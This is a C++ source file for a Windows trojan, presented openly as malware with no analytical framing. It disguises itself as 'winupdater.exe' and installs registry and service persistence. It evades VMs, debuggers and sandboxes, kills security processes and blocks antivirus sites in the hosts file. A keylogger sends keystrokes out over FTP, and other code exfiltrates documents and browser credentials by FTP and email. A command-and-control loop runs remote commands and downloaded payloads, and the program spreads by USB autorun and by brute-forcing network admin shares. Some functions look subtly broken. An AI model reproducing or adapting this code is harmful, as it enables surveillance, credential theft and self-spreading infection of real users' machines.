#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <sstream>
#include <thread>
#include <vector>
#include <algorithm>
#include <ctime>
#include <iomanip>
#include <filesystem>
#include <regex>
#include <winreg.h>
#include <curl/curl.h>
#include <json/json.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

// Global variables
Json::Value config;
std::string appDataPath;
std::string trojanPath;
std::string logPath;
bool isRunning = true;

// Function declarations
bool LoadConfig();
bool InstallPersistence();
bool GetPublicIP(std::string& ip);
bool BlacklistIP(const std::string& ip);
bool IsVM();
bool IsDebuggerPresent();
bool IsSandbox();
void KillSecurityProcesses();
void StartKeylogger();
void StartExfiltration();
void StartC2Communication();
void SpreadToUSB();
void SpreadToNetwork();
void WriteLog(const std::string& message);
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp);

// Main function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Get paths
    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        appDataPath = std::string(appData) + "\\Microsoft\\Windows";
        trojanPath = appDataPath + "\\winupdater.exe";
        logPath = appDataPath + "\\updater.log";
        
        // Create directory if it doesn't exist
        if (!fs::exists(appDataPath)) {
            fs::create_directories(appDataPath);
        }
        
        // Move ourselves to the permanent location if needed
        if (fs::path(lpCmdLine).filename().string() != "winupdater.exe") {
            CopyFileA(GetCommandLineA(), trojanPath.c_str(), FALSE);
            
            // Start the new instance
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            CreateProcessA(trojanPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            
            // Exit the current instance
            ExitProcess(0);
        }
    }
    
    // Load configuration
    if (!LoadConfig()) {
        WriteLog("Failed to load configuration");
        return 1;
    }
    
    // Check for analysis environment
    if (config["anti_analysis"]["vm_detection"].asBool() && IsVM()) {
        WriteLog("VM detected, exiting");
        return 0;
    }
    
    if (config["anti_analysis"]["debugger_detection"].asBool() && IsDebuggerPresent()) {
        WriteLog("Debugger detected, exiting");
        return 0;
    }
    
    if (config["anti_analysis"]["sandbox_detection"].asBool() && IsSandbox()) {
        WriteLog("Sandbox detected, exiting");
        return 0;
    }
    
    // Kill security processes
    KillSecurityProcesses();
    
    // Install persistence mechanisms
    if (!InstallPersistence()) {
        WriteLog("Failed to install persistence");
    }
    
    // Get and blacklist public IP
    std::string publicIP;
    if (GetPublicIP(publicIP)) {
        BlacklistIP(publicIP);
    }
    
    // Start malicious modules in separate threads
    std::thread keyloggerThread(StartKeylogger);
    std::thread exfilThread(StartExfiltration);
    std::thread c2Thread(StartC2Communication);
    std::thread usbThread(SpreadToUSB);
    std::thread networkThread(SpreadToNetwork);
    
    // Main loop
    while (isRunning) {
        Sleep(1000);
    }
    
    // Cleanup
    keyloggerThread.join();
    exfilThread.join();
    c2Thread.join();
    usbThread.join();
    networkThread.join();
    
    return 0;
}

// Load configuration from JSON file
bool LoadConfig() {
    std::ifstream configFile(trojanPath.substr(0, trojanPath.find_last_of("\\/")) + "\\config.json");
    if (!configFile.is_open()) {
        return false;
    }
    
    Json::CharReaderBuilder builder;
    std::string errors;
    
    if (!Json::parseFromStream(builder, configFile, &config, &errors)) {
        return false;
    }
    
    return true;
}

// Install persistence mechanisms
bool InstallPersistence() {
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyA(HKEY_CURRENT_USER, config["persistence"]["registry_key"].asCString(), &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, config["persistence"]["value_name"].asCString(), 0, REG_SZ, 
                      (BYTE*)trojanPath.c_str(), trojanPath.length() + 1);
        RegCloseKey(hKey);
    }
    
    // Service persistence
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager) {
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            config["persistence"]["service_name"].asCString(),
            "Windows Update Service",
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            trojanPath.c_str(),
            NULL, NULL, NULL, NULL, NULL);
            
        if (hService) {
            StartService(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        
        CloseServiceHandle(hSCManager);
    }
    
    return true;
}

// Get public IP address
bool GetPublicIP(std::string& ip) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[1024];
    DWORD bytesRead;
    if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        ip = std::string(buffer);
    }
    else {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Blacklist IP address
bool BlacklistIP(const std::string& ip) {
    // Add to Windows Firewall blocklist
    std::string command = "netsh advfirewall firewall add rule name=\"Block_" + ip + "\" dir=in action=block remoteip=" + ip;
    system(command.c_str());
    
    // Report to blacklist services
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        for (const auto& url : config["ip_blacklisting"]["blacklist_urls"]) {
            std::string postData = "ip=" + ip + "&reason=malware";
            
            curl_easy_setopt(curl, CURLOPT_URL, url.asCString());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
            
            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            
            // Skip SSL verification for stealth
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            
            res = curl_easy_perform(curl);
            
            if (res != CURLE_OK) {
                WriteLog("Failed to report IP to blacklist service");
            }
        }
        
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
    
    // Add to hosts file to block access to security sites
    std::string hostsPath = std::string(getenv("windir")) + "\\System32\\drivers\\etc\\hosts";
    std::ofstream hostsFile(hostsPath, std::ios::app);
    if (hostsFile.is_open()) {
        hostsFile << "\n# Blocked by security update\n";
        hostsFile << "0.0.0.0 windowsupdate.microsoft.com\n";
        hostsFile << "0.0.0.0 www.virustotal.com\n";
        hostsFile << "0.0.0.0 virusscan.jotti.org\n";
        hostsFile << "0.0.0.0 www.hybrid-analysis.com\n";
        hostsFile.close();
    }
    
    return true;
}

// Check if running in a virtual machine
bool IsVM() {
    // Check for VM registry keys
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VMTools", &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // Check for VM processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                if (processName.find("vboxservice.exe") != std::string::npos ||
                    processName.find("vboxtray.exe") != std::string::npos ||
                    processName.find("vmtoolsd.exe") != std::string::npos ||
                    processName.find("vmwaretray.exe") != std::string::npos ||
                    processName.find("vmwareuser.exe") != std::string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
    
    // Check for VM MAC addresses
    IP_ADAPTER_INFO* pAdapterInfo;
    IP_ADAPTER_INFO* pAdapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        return false;
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return false;
        }
    }
    
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        pAdapter = pAdapterInfo;
        while (pAdapter) {
            std::string macAddr = pAdapter->Address;
            if (macAddr.find("\x08\x00\x27") == 0 || // VirtualBox
                macAddr.find("\x00\x05\x69") == 0 || // VMware
                macAddr.find("\x00\x0C\x29") == 0 || // VMware
                macAddr.find("\x00\x1C\x42") == 0) { // Parallels
                free(pAdapterInfo);
                return true;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    free(pAdapterInfo);
    return false;
}

// Check if a debugger is attached
bool IsDebuggerPresent() {
    return IsDebuggerPresent() ? true : false;
}

// Check if running in a sandbox
bool IsSandbox() {
    // Check for sandbox-specific files
    if (fs::exists("C:\\sandbox.txt") || 
        fs::exists("C:\\analysis.txt") ||
        fs::exists("C:\\sample.exe") ||
        fs::exists("C:\\malware.exe")) {
        return true;
    }
    
    // Check for sandbox registry keys
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Sandboxie", &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // Check for common sandbox processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                if (processName.find("sandboxie.exe") != std::string::npos ||
                    processName.find("procmon.exe") != std::string::npos ||
                    processName.find("wireshark.exe") != std::string::npos ||
                    processName.find("fiddler.exe") != std::string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
    
    // Check system uptime (sandboxes often have low uptime)
    DWORD uptime = GetTickCount() / 1000;
    if (uptime < 300) { // Less than 5 minutes
        return true;
    }
    
    // Check for low number of processes
    DWORD processCount = 0;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                processCount++;
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
    
    if (processCount < 50) { // Less than 50 processes
        return true;
    }
    
    return false;
}

// Kill security-related processes
void KillSecurityProcesses() {
    for (const auto& process : config["anti_analysis"]["kill_processes"]) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            continue;
        }
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                std::string targetProcess = process.asString();
                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), ::tolower);
                
                if (processName.find(targetProcess) != std::string::npos) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        WriteLog("Terminated process: " + processName);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
    }
}

// Write to log file
void WriteLog(const std::string& message) {
    std::ofstream logFile(logPath, std::ios::app);
    if (logFile.is_open()) {
        auto now = std::chrono::system_clock::now();
        auto in_time_t = std::chrono::system_clock::to_time_t(now);
        
        std::stringstream ss;
        ss << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d %X") << " - " << message << std::endl;
        
        logFile << ss.str();
        logFile.close();
    }
}

// Start keylogger functionality
void StartKeylogger() {
    if (!config["keylogger"]["enabled"].asBool()) {
        return;
    }
    
    std::string keylogPath = appDataPath + "\\" + config["keylogger"]["log_file"].asCString();
    std::ofstream keylogFile(keylogPath, std::ios::app);
    
    if (!keylogFile.is_open()) {
        WriteLog("Failed to open keylog file");
        return;
    }
    
    // Set keyboard hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            // Get key name
            DWORD dwKey = pStruct->vkCode;
            char key[16];
            GetKeyNameTextA(pStruct->scanCode << 16, key, sizeof(key));
            
            // Write to keylog file
            std::ofstream keylogFile(appDataPath + "\\" + config["keylogger"]["log_file"].asCString(), std::ios::app);
            if (keylogFile.is_open()) {
                keylogFile << key;
                keylogFile.close();
            }
        }
        
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }, GetModuleHandle(NULL), 0);
    
    // Message loop for hook
    MSG msg;
    while (isRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Periodically exfiltrate keystrokes
        static DWORD lastExfil = 0;
        DWORD currentTime = GetTickCount();
        if (currentTime - lastExfil > config["keylogger"]["exfil_interval"].asUInt() * 1000) {
            lastExfil = currentTime;
            
            // Read keylog file
            std::ifstream keylogFile(appDataPath + "\\" + config["keylogger"]["log_file"].asCString());
            if (keylogFile.is_open()) {
                std::string keystrokes((std::istreambuf_iterator<char>(keylogFile)),
                                       std::istreambuf_iterator<char>());
                keylogFile.close();
                
                if (!keystrokes.empty()) {
                    // Exfiltrate keystrokes via FTP
                    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                    if (hInternet) {
                        HINTERNET hFtp = InternetConnectA(
                            hInternet,
                            config["exfiltration"]["ftp_host"].asCString(),
                            INTERNET_DEFAULT_FTP_PORT,
                            config["exfiltration"]["ftp_user"].asCString(),
                            config["exfiltration"]["ftp_pass"].asCString(),
                            INTERNET_SERVICE_FTP,
                            0, 0);
                            
                        if (hFtp) {
                            std::string remotePath = "/logs/" + std::to_string(time(NULL)) + ".log";
                            FtpPutFileA(hFtp, 
                                       (appDataPath + "\\" + config["keylogger"]["log_file"].asCString()).c_str(),
                                       remotePath.c_str(),
                                       FTP_TRANSFER_TYPE_BINARY,
                                       0);
                            
                            InternetCloseHandle(hFtp);
                        }
                        
                        InternetCloseHandle(hInternet);
                    }
                    
                    // Clear keylog file
                    std::ofstream clearFile(appDataPath + "\\" + config["keylogger"]["log_file"].asCString(), std::ios::trunc);
                    clearFile.close();
                }
            }
        }
    }
    
    UnhookWindowsHookEx(hHook);
    keylogFile.close();
}

// Start data exfiltration module
void StartExfiltration() {
    // Collect system information
    std::stringstream sysInfo;
    
    // Computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        sysInfo << "Computer: " << computerName << std::endl;
    }
    
    // Username
    char username[MAX_COMPUTERNAME_LENGTH + 1];
    size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        sysInfo << "User: " << username << std::endl;
    }
    
    // OS version
    OSVERSIONINFO osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionExA(&osvi)) {
        sysInfo << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion 
                << " Build " << osvi.dwBuildNumber << std::endl;
    }
    
    // IP addresses
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo) {
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        }
        
        if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
            pAdapter = pAdapterInfo;
            sysInfo << "Network Adapters:" << std::endl;
            
            while (pAdapter) {
                sysInfo << "  " << pAdapter->Description << std::endl;
                sysInfo << "    IP: " << pAdapter->IpAddressList.IpAddress.String << std::endl;
                
                IP_ADDR_STRING* pIPAddr = &pAdapter->GatewayList;
                while (pIPAddr) {
                    sysInfo << "    Gateway: " << pIPAddr->IpAddress.String << std::endl;
                    pIPAddr = pIPAddr->Next;
                }
                
                pAdapter = pAdapter->Next;
            }
        }
        
        free(pAdapterInfo);
    }
    
    // Find interesting files
    std::vector<std::string> interestingFiles;
    std::vector<std::string> searchPaths = {
        getenv("USERPROFILE") + std::string("\\Documents"),
        getenv("USERPROFILE") + std::string("\\Desktop"),
        getenv("USERPROFILE") + std::string("\\Downloads"),
        getenv("APPDATA") + std::string("\\Microsoft\\Credentials"),
        getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default")
    };
    
    std::vector<std::string> fileExtensions = {
        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", 
        ".ppt", ".pptx", ".csv", ".log", ".db"
    };
    
    for (const auto& path : searchPaths) {
        try {
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                    
                    if (std::find(fileExtensions.begin(), fileExtensions.end(), extension) != fileExtensions.end()) {
                        interestingFiles.push_back(entry.path().string());
                        
                        // Limit to 50 files to avoid suspicion
                        if (interestingFiles.size() >= 50) {
                            break;
                        }
                    }
                }
            }
        } catch (...) {
            // Ignore access errors
        }
        
        if (interestingFiles.size() >= 50) {
            break;
        }
    }
    
    // Create ZIP with interesting files
    std::string zipPath = appDataPath + "\\temp.zip";
    
    // Use PowerShell to create ZIP
    std::string psCommand = "powershell -Command \"& { \$compress = @";
    for (const auto& file : interestingFiles) {
        psCommand += "'" + file + "'; ";
    }
    psCommand += "; Compress-Archive -Path \$compress -DestinationPath '" + zipPath + "' -Force; }\"";
    system(psCommand.c_str());
    
    // Send system info via email
    std::string emailBody = sysInfo.str();
    
    // Use PowerShell to send email
    std::string emailCommand = "powershell -Command \"& {" +
        "\$smtpServer = '" + config["exfiltration"]["smtp_server"].asCString() + "'; " +
        "\$smtpPort = " + std::to_string(config["exfiltration"]["smtp_port"].asUInt()) + "; " +
        "\$smtpUser = '" + config["exfiltration"]["smtp_user"].asCString() + "'; " +
        "\$smtpPass = '" + config["exfiltration"]["smtp_pass"].asCString() + "'; " +
        "\$to = '" + config["exfiltration"]["smtp_recipient"].asCString() + "'; " +
        "$from = $smtpUser; " +
        "$subject = 'System Info from $env:COMPUTERNAME'; " +
        "\$body = '" + emailBody + "'; " +
        "$secpass = ConvertTo-SecureString $smtpPass -AsPlainText -Force; " +
        "\$cred = New-Object System.Management.Automation.PSCredential(\$smtpUser, \$secpass); " +
        "Send-MailMessage -To \$to -From \$from -Subject \$subject -Body \$body -SmtpServer \$smtpServer -Port \$smtpPort -Credential \$cred -UseSsl; }\"";
    system(emailCommand.c_str());
    
    // Send ZIP via FTP
    if (fs::exists(zipPath)) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hFtp = InternetConnectA(
                hInternet,
                config["exfiltration"]["ftp_host"].asCString(),
                INTERNET_DEFAULT_FTP_PORT,
                config["exfiltration"]["ftp_user"].asCString(),
                config["exfiltration"]["ftp_pass"].asCString(),
                INTERNET_SERVICE_FTP,
                0, 0);
                
            if (hFtp) {
                std::string remotePath = "/files/" + std::to_string(time(NULL)) + ".zip";
                FtpPutFileA(hFtp, zipPath.c_str(), remotePath.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
                
                InternetCloseHandle(hFtp);
            }
            
            InternetCloseHandle(hInternet);
        }
        
        // Delete local ZIP
        fs::remove(zipPath);
    }
}

// Start C2 communication
void StartC2Communication() {
    while (isRunning) {
        // Get system information
        std::string computerName;
        char buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(buffer);
        if (GetComputerNameA(buffer, &size)) {
            computerName = buffer;
        }
        
        std::string userName;
        size = sizeof(buffer);
        if (GetUserNameA(buffer, &size)) {
            userName = buffer;
        }
        
        std::string publicIP;
        GetPublicIP(publicIP);
        
        // Create JSON payload
        Json::Value payload;
        payload["computer_name"] = computerName;
        payload["user_name"] = userName;
        payload["public_ip"] = publicIP;
        payload["timestamp"] = (Json::UInt64)time(NULL);
        
        // Send heartbeat
        CURL* curl;
        CURLcode res;
        
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        
        if (curl) {
            std::string url = std::string("https://") + 
                             config["c2_server"]["host"].asCString() + 
                             config["c2_server"]["endpoint"].asCString();
            
            std::string jsonData = Json::writeString(Json::StreamWriterBuilder(), payload);
            
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
            
            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            
            // Skip SSL verification for stealth
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            
            // Response string
            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                // Parse response for commands
                Json::Value responseJson;
                Json::CharReaderBuilder builder;
                std::string errors;
                
                if (Json::parseFromStream(builder, response, &responseJson, &errors)) {
                    if (responseJson.isMember("commands")) {
                        for (const auto& command : responseJson["commands"]) {
                            // Execute command
                            std::string cmd = command.asString();
                            
                            if (cmd == "blacklist") {
                                if (responseJson.isMember("target_ip")) {
                                    BlacklistIP(responseJson["target_ip"].asString());
                                }
                            } else if (cmd == "exfiltrate") {
                                StartExfiltration();
                            } else if (cmd == "spread") {
                                if (config["spreading"]["enabled"].asBool()) {
                                    SpreadToUSB();
                                    SpreadToNetwork();
                                }
                            } else if (cmd == "update") {
                                if (responseJson.isMember("update_url")) {
                                    // Download and execute update
                                    std::string updateUrl = responseJson["update_url"].asString();
                                    std::string updatePath = appDataPath + "\\update.exe";
                                    
                                    URLDownloadToFileA(NULL, updateUrl.c_str(), updatePath.c_str(), 0, NULL);
                                    
                                    if (fs::exists(updatePath)) {
                                        STARTUPINFOA si = { sizeof(si) };
                                        PROCESS_INFORMATION pi;
                                        CreateProcessA(updatePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                                        
                                        // Exit current process
                                        isRunning = false;
                                    }
                                }
                            } else if (cmd == "shutdown") {
                                isRunning = false;
                            } else {
                                // Execute custom command
                                system(cmd.c_str());
                            }
                        }
                    }
                }
            }
            
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
        }
        
        curl_global_cleanup();
        
        // Wait for next heartbeat
        Sleep(config["c2_server"]["heartbeat_interval"].asUInt() * 1000);
    }
}

// Spread to USB drives
void SpreadToUSB() {
    if (!config["spreading"]["usb_spread"].asBool()) {
        return;
    }
    
    // Get list of drive letters
    DWORD drives = GetLogicalDrives();
    
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char driveLetter = 'A' + i;
            
            // Check if it's a removable drive
            char drivePath[] = "A:\\";
            drivePath[0] = driveLetter;
            
            UINT driveType = GetDriveTypeA(drivePath);
            if (driveType == DRIVE_REMOVABLE) {
                // Create autorun.inf file
                std::string autorunPath = std::string(drivePath) + "autorun.inf";
                std::ofstream autorunFile(autorunPath);
                if (autorunFile.is_open()) {
                    autorunFile << "[autorun]\n";
                    autorunFile << "open=launch.exe\n";
                    autorunFile << "shell\\open\\command=launch.exe\n";
                    autorunFile << "shell\\explore\\command=launch.exe\n";
                    autorunFile.close();
                }
                
                // Copy trojan to USB drive
                std::string usbTrojanPath = std::string(drivePath) + "launch.exe";
                CopyFileA(trojanPath.c_str(), usbTrojanPath.c_str(), FALSE);
                
                // Set file attributes to hidden
                SetFileAttributesA(autorunPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
                SetFileAttributesA(usbTrojanPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
                
                WriteLog("Spread to USB drive: " + std::string(1, driveLetter));
            }
        }
    }
}

// Spread to network
void SpreadToNetwork() {
    if (!config["spreading"]["network_spread"].asBool()) {
        return;
    }
    
    // Enumerate network computers
    NET_API_STATUS res;
    LPSERVER_INFO_101 pBuf = NULL;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    
    res = NetServerEnum(NULL, 101, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH,
                        &dwEntriesRead, &dwTotalEntries, SV_TYPE_WORKSTATION | SV_TYPE_SERVER,
                        NULL, &dwResumeHandle);
    
    if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA) {
        LPSERVER_INFO_101 pTmpBuf;
        
        if ((pTmpBuf = pBuf) != NULL) {
            for (DWORD i = 0; i < dwEntriesRead; i++) {
                if (pTmpBuf != NULL) {
                    std::string computerName = pTmpBuf->sv101_name;
                    
                    // Try to connect to admin shares
                    std::string adminShare = "\\\\" + computerName + "\\admin\$";
                    NETRESOURCE nr;
                    nr.dwType = RESOURCETYPE_ANY;
                    nr.lpLocalName = NULL;
                    nr.lpRemoteName = (LPSTR)adminShare.c_str();
                    nr.lpProvider = NULL;
                    
                    // Try common passwords
                    std::vector<std::string> passwords = {
                        "", "password", "admin", "123456", "12345678", "qwerty"
                    };
                    
                    for (const auto& password : passwords) {
                        // Try to connect with current user
                        DWORD result = WNetAddConnection2A(&nr, password.c_str(), NULL, CONNECT_TEMPORARY);
                        
                        if (result == NO_ERROR) {
                            // Copy trojan to remote system
                            std::string remotePath = adminShare + "\\System32\\winupdater.exe";
                            CopyFileA(trojanPath.c_str(), remotePath.c_str(), FALSE);
                            
                            // Create scheduled task on remote system
                            std::string taskCommand = "schtasks /s " + computerName + 
                                                     " /create /tn \"Windows Update\" /tr \"\\System32\\winupdater.exe\" /sc onlogon";
                            system(taskCommand.c_str());
                            
                            // Disconnect
                            WNetCancelConnection2A(adminShare.c_str(), 0, TRUE);
                            
                            WriteLog("Spread to network computer: " + computerName);
                            break;
                        }
                    }
                    
                    pTmpBuf++;
                }
            }
        }
    }
    
    if (pBuf != NULL) {
        NetApiBufferFree(pBuf);
    }
}

// CURL write callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t totalSize = size * nmemb;
    userp->append((char*)contents, totalSize);
    return totalSize;
}
